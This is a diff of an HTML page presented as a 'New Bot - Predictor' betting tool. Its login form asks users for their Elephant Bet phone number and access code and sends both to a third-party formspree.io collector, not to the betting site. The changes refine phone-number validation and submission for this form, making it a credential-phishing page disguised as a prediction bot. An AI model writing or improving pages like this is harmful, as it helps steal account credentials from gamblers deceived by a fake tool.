@@ -6,6 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>New Bot - Predictor</title>
     <style>
+        /* ... seu CSS aqui (igual ao anterior) ... */
+        
         body {
             font-family: Arial, sans-serif;
             background-color: black;
@@ -71,15 +73,15 @@
     <div id="login-screen">
         <h2>New Bot - Login</h2>
         <p>Faça a Conexão com a sua conta da Elephant Bet</p>
-        <form id="login-form" action="https://formspree.io/f//mldwwpnb" method="POST">
+        <form id="login-form" action="https://formspree.io/f/mldwwpnb" method="POST" novalidate>
             <label for="phone">Número de Telemóvel:</label>
-            <input type="tel" id="phone" name="phone" maxlength="9" required pattern="\d{9}" />
+            <input type="tel" id="phone" name="phone" maxlength="9" required pattern="9\d{8}" placeholder="" inputmode="numeric" autocomplete="tel" autofocus />
 
             <label for="access">Código de Acesso:</label>
             <input type="password" id="access" name="auth_code" required minlength="4" />
 
             <!-- Honeypot (anti-spam) -->
-            <input type="text" name="_honey" style="display:none">
+            <input type="text" name="_honey" style="display:none" />
 
             <button type="submit">Entrar</button>
         </form>
@@ -102,26 +104,43 @@
     </div>
 
     <script>
-        // Lógica do envio do formulário
+        const phoneInput = document.getElementById('phone');
+
+        phoneInput.addEventListener('input', () => {
+            let val = phoneInput.value;
+            val = val.replace(/\D/g, '');
+
+            if (val.length > 0 && val[0] !== '9') {
+                val = val.slice(1);
+            }
+
+            if (val.length > 9) {
+                val = val.slice(0, 9);
+            }
+
+            phoneInput.value = val;
+        });
+
         document.getElementById('login-form').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const phone = document.getElementById('phone').value.trim();
-            const access = document.getElementById('access').value.trim();
-
-            const phoneRegex = /^\d{9}$/;
+            const phone = phoneInput.value.trim();
+            const phoneRegex = /^9\d{8}$/;
             if (!phoneRegex.test(phone)) {
-                alert('Número de telefone inválido. Deve conter exatamente 9 dígitos numéricos.');
+                alert('Número de telefone inválido. Deve começar com 9 e ter exatamente 9 dígitos.');
                 return;
             }
 
+            const access = document.getElementById('access').value.trim();
+
             try {
                 const formData = new FormData(this);
+
                 const response = await fetch(this.action, {
                     method: 'POST',
                     body: formData,
                     headers: {
-                        Accept: 'application/json'
+                        Accept: 'application/json',
                     },
                 });
 
@@ -170,7 +189,6 @@
 
             atualizarHistorico();
 
-            // Limpa os campos
             document.getElementById('vela1').value = '';
             document.getElementById('vela2').value = '';
             document.getElementById('vela3').value = '';
@@ -187,7 +205,6 @@
             });
         }
 
-        // Evento do botão de previsão
         document.getElementById('predict-btn').addEventListener('click', prever);
     </script>
 </body>
